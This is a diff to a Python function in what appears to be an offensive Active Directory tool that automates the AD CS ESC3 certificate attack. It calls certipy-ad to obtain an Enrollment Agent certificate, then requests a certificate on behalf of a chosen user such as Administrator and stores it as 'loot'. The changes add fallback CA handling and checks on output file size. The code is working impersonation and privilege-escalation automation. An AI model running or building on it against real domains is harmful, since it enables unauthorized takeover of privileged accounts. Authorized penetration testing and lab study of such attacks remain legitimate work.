@@ -8,13 +8,13 @@ def abuse_esc3(session, agent_template):
 
     cas = session.adcs_metadata.get("cas", [])
     if not cas:
-        print(red("[-] No CA data found in session. Run 'adcs enum' first."))
-        return
-
-    ca_name = cas[0].get("name")
-    if not ca_name or ca_name.lower() == "n/a":
-        print(red("[-] Invalid or missing CA name."))
-        return
+        print(yellow("[!] No CA info found in session. Using fallback value 'UNKNOWN-CA'."))
+        ca_name = "UNKNOWN-CA"
+    else:
+        ca_name = cas[0].get("name", "").strip()
+        if not ca_name or ca_name.lower() in ["n/a", "none", ""]:
+            print(yellow("[!] CA name invalid or missing. Using fallback value 'UNKNOWN-CA'."))
+            ca_name = "UNKNOWN-CA"
 
     # Build authentication part
     if session.hash:
@@ -36,12 +36,12 @@ def abuse_esc3(session, agent_template):
         "-out", agent_out
     ]
 
-    print(blue(f"[*] Step 1: Requesting Enrollment Agent cert using template '{agent_template}'...\n\nPress Enter"))
+    print(blue(f"[*] Step 1: Requesting Enrollment Agent cert using template '{agent_template}'..."))
     enroll_str = " ".join(enroll_cmd)
     output1, err1 = run_command(enroll_str)
     print(output1.strip() or err1.strip())
 
-    if not os.path.exists(agent_out):
+    if not os.path.exists(agent_out) or os.path.getsize(agent_out) < 100:
         print(red("[-] Enrollment Agent certificate not created."))
         print(yellow("[!] If the attack failed, try rerunning the command or run it manually. It may be a temporary connection issue."))
         print(yellow(f"[*] Command executed: {enroll_str}"))
@@ -50,7 +50,7 @@ def abuse_esc3(session, agent_template):
     print(green(f"[+] Agent certificate saved to: {agent_out}"))
 
     # Step 2: Abuse Enrollment Agent to request on behalf of another user
-    target_user = input("[?] Enter target user to impersonate (e.g., lab\\Administrator): ").strip()
+    target_user = input("[?] Enter target user to impersonate (e.g., LAB\\Administrator): ").strip()
     second_out = "esc3_onbehalf.pfx"
     abuse_cmd = [
         "certipy-ad", "req",
@@ -63,12 +63,12 @@ def abuse_esc3(session, agent_template):
         "-out", second_out
     ]
 
-    print(blue(f"[*] Step 2: Requesting cert on behalf of '{target_user}'...\n\nPress Enter"))
+    print(blue(f"[*] Step 2: Requesting cert on behalf of '{target_user}'..."))
     abuse_str = " ".join(abuse_cmd)
     output2, err2 = run_command(abuse_str)
     print(output2.strip() or err2.strip())
 
-    if os.path.exists(second_out):
+    if os.path.exists(second_out) and os.path.getsize(second_out) > 100:
         with open(second_out, "rb") as f:
             binary_data = f.read()
         save_loot(os.path.basename(second_out), binary_data, binary=True)
